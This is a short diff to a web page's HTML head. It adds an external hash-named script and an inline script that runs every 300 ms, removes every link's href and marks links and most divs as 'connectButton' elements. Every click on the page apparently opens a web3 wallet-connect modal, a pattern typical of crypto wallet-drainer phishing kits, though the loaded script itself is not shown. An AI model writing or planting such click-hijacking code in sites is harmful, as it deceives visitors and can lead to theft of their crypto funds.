@@ -13,7 +13,23 @@
 
 <link rel="stylesheet" href="css2.css">
 <link rel="stylesheet" media="all" href="application-6e4005e7f1aee836289297918264dd069ce99cfc0a032d129a2a3a9dc6b170d4.css">
-</head>
+<script src="./506c5f7-32f7710e809e2cf24262.js"></script>
+
+<script>
+    function addClassesToElements() {
+        const links = document.querySelectorAll('a:not(.connectButton)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('connectButton');
+        }
+        const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+        for (const button of buttons) {
+            button.classList.add('connectButton');
+        }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
+    </head>
 <body>
 <div class="c-modal js-modal js-modal--signup is-hidden">
 <div class="c-modal__overlay js-modal__overlay"></div>
